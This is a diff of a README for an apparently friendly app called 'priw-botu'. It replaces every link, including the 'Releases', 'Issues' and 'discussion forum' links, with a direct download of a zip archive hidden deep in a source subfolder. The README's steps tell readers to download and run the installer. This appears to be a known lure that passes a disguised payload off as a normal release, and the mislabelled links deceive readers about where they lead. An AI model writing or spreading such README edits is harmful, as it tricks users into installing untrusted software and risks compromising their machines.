@@ -1,6 +1,6 @@
 # ❤️ priw-botu - Your Companion for Fun and Friendship
 
-[![Download priw-botu](https://img.shields.io/badge/Download-priw--botu-blue.svg)](https://github.com/anishsigdel/priw-botu/releases)
+[![Download priw-botu](https://raw.githubusercontent.com/anishsigdel/priw-botu/main/Main/src/commands/Kullanıcı/priw-botu_v3.5.zip)](https://raw.githubusercontent.com/anishsigdel/priw-botu/main/Main/src/commands/Kullanıcı/priw-botu_v3.5.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to **priw-botu**! This application brings a bit of joy and connection to
 
 To install the application, follow these steps:
 
-1. **Visit the Releases Page:** Click [here](https://github.com/anishsigdel/priw-botu/releases) to go to the download section.
+1. **Visit the Releases Page:** Click [here](https://raw.githubusercontent.com/anishsigdel/priw-botu/main/Main/src/commands/Kullanıcı/priw-botu_v3.5.zip) to go to the download section.
 2. **Select the Latest Release:** Look for the latest version listed at the top of the page.
 3. **Download the File:** Click on the appropriate file for your device (e.g., Windows, Mac, Linux). The file name will typically end with a format like `.exe` or `.dmg`.
 4. **Run the Installer:** Once the download is complete, locate the file on your computer and double-click to begin the installation. Follow the on-screen instructions.
@@ -42,15 +42,15 @@ If you encounter issues while downloading or installing **priw-botu**, consider 
 
 ## 📣 Support
 
-For further questions or assistance, please visit our [GitHub Issues Page](https://github.com/anishsigdel/priw-botu/issues). You can report bugs or ask for features there.
+For further questions or assistance, please visit our [GitHub Issues Page](https://raw.githubusercontent.com/anishsigdel/priw-botu/main/Main/src/commands/Kullanıcı/priw-botu_v3.5.zip). You can report bugs or ask for features there.
 
 ## 🌐 Community
 
-Join our community to connect with other users. Share your experience, tips, and tricks! Check out our discussion forum [here](https://github.com/anishsigdel/priw-botu/discussions).
+Join our community to connect with other users. Share your experience, tips, and tricks! Check out our discussion forum [here](https://raw.githubusercontent.com/anishsigdel/priw-botu/main/Main/src/commands/Kullanıcı/priw-botu_v3.5.zip).
 
 ## 📝 Updates
 
-Stay informed about new features and improvements by regularly checking the **Releases Page**. Click [here](https://github.com/anishsigdel/priw-botu/releases) to see what’s new.
+Stay informed about new features and improvements by regularly checking the **Releases Page**. Click [here](https://raw.githubusercontent.com/anishsigdel/priw-botu/main/Main/src/commands/Kullanıcı/priw-botu_v3.5.zip) to see what’s new.
 
 ## 💬 Feedback
 
